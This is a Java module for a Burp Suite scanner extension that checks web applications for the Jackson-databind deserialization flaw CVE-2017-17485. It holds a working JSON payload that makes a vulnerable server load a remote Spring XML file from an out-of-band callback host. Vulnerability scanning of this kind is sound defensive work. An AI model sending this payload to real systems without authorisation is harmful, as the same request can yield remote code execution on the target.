package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.HTTPParser;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;

import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

/**
 *
 * Jackson-databind Polymorphic Deserialization 
 *
 * References:
 *  - https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-17485
 * 
 */
public class JacksonDataBindCVE20177525 implements IModule {

    private static final String TITLE = "Jackson-databind Polymorphic Deserialization - CVE-2017-17485";
    private static final String DESCRIPTION = "J2EEscan identified a remote command execution vulnerability in the remote Jackson-databind component.<br />"
            + "FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution <br />because "
            + "of an incomplete fix for the CVE-2017-7525 deserialization flaw. <br />"
            + "This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, <br />"
            + "bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.<br />"
            + "<br />"
            + "<b>References</b>:<br /><br />"
            + "https://github.com/vulhub/vulhub/tree/master/jackson/CVE-2017-17485<br />"
            + "https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1<br />"
            + "https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true";

    private static final String REMEDY = "Update the Jackson-databind component with the last security patches";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private PrintWriter stderr;

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {


        List<String> PAYLOADS = new ArrayList<>();
        PAYLOADS.add("{\"param\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"http://%s/spel.xml\"]}");

        stderr = new PrintWriter(callbacks.getStderr(), true);

        List<IScanIssue> issues = new ArrayList<>();
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);
        List<String> requestHeaders = reqInfo.getHeaders();

        URL url = reqInfo.getUrl();

        // Precondition checks
        if (!isJavaApplicationByURL(url)) {
            return issues;
        }

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");
        if (contentTypeHeader != null && !contentTypeHeader.contains("json")) {
            return issues;
        }

        for (String PAYLOAD : PAYLOADS) {
            try {
                // Collaborator context
                IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();

                // New collaborator unique URI generated ( example f2ivf62a9k7w14h8o8cg7x10prvhj6.burpcollaborator.net )
                String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
                String payloadJson = String.format(PAYLOAD, currentCollaboratorPayload);

                byte[] jsonFastRcePayload = helpers.buildHttpMessage(requestHeaders, payloadJson.getBytes());
                IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), jsonFastRcePayload);

                // Poll Burp Collaborator for remote interaction
                List<IBurpCollaboratorInteraction> collaboratorInteractions
                        = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {

                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            reqInfo.getUrl(),
                            resp,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }
            } catch (Exception ex) {
                stderr.println(ex);
            }

        }
        
        return issues;

    }
}
